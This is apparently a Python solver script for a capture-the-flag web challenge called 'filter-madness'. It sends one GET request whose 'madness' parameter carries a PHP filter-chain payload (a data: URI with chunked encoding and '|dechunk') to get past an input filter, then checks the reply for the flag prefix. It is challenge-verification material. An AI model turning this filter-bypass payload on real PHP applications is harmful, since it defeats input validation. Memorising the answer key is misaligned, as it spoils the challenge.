from pathlib import Path
import requests
import sys

CHAL_URL = 'https://filter-madness-tlejfksioa-ul.a.run.app'

with open(Path(__file__).with_name('flag-prefix.txt'), 'r') as file:
    FLAG_PREFIX = file.read().replace('\n', '')

def solve():
    flagUrl = f"{CHAL_URL}/?madness=resource=data:,14%0D%0Azombies%20for%20the%20flag%0D%0A0%0D%0A|dechunk"

    response = requests.get(flagUrl)

    if FLAG_PREFIX not in response.text:
        print('error, flag not found: ', response.status_code, response.text)
        sys.exit(1)

    print('filter-madness solved')


solve()
